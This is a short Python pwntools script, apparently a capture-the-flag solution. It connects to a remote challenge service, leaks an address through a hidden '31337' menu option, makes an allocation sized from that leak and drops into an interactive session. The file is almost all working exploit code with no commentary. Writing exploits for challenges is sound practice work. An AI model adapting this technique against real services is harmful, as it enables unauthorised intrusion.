from pwn import *

#p = process('./unhexp')
p = remote("dets.kro.kr", 30003)
e = ELF("./unhexp")

context.log_level = "debug"
key = 0

def alloc(idx, size, data):
	p.sendlineafter('>> ', str(1))
	p.sendlineafter('idx : ', str(idx))
	p.sendlineafter('size : ', str(size))
	p.sendlineafter('data : ', str(data))

def delete(idx):
	p.sendlineafter('>> ', str(2))
	p.sendlineafter('idx : ', str(idx))

def find_key():
	global key

	p.sendlineafter('>> ', '31337')
	p.recvuntil('addr : ')
	key = int(p.recv(15),16)

find_key()

pause()
log.info('key_addr : ' + hex(key))
alloc(0,key+1,0)

p.sendlineafter('>> ', '31337')


p.interactive()
